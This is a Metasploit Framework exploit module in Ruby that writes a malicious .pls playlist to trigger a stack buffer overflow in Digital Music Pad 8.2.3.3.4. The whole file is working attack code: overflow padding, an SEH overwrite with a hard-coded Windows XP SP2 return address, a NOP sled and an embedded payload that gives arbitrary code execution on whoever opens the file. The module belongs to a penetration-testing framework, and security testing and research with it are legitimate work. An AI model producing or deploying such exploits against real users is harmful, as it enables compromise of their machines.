##
# $Id: digital_music_pad_pls.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Digital Music Pad Version 8.2.3.3.4 Stack Buffer Overflow',
			'Description' => %q{
					This module exploits a buffer overflow in Digital Music Pad Version 8.2.3.3.4
				When opening a malicious pls file with the Digital Music Pad,
				a remote attacker could overflow a buffer and execute
				arbitrary code.
			},
			'License' => MSF_LICENSE,
			'Author' =>
				[
					'Abhishek Lyall <abhilyall[at]gmail.com>'
				],
			'Version' => '$Revision: 10998 $',
			'References' =>
				[
					[ 'OSVDB', '68178' ],
					[ 'URL', 'http://secunia.com/advisories/41519/' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/15134' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload' =>
				{
					'Space' => 4720,
					'BadChars' => "\x00\x20\x0a\x0d",
					'DisableNops' => 'True',
				},
			'Platform' => 'win',
			'Targets' =>
				[
					[ 'Windows XP SP2', { 'Ret' => 0x73421DEF } ], # p/p/r msvbvm60.dll
				],
			'Privileged' => false,
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Sep 17 2010'))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'msf.pls']),
			], self.class)
	end

	def exploit

		# PLS Header
		sploit = "[playlist]\n"
		sploit << "File1="

		sploit << rand_text_alphanumeric(260)
		sploit << generate_seh_record(target.ret)

		sploit << "\x90" * 12                   # nop sled
		sploit << payload.encoded

		sploit << "\x90" * (4720 - payload.encoded.length)

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(sploit)
	end

end
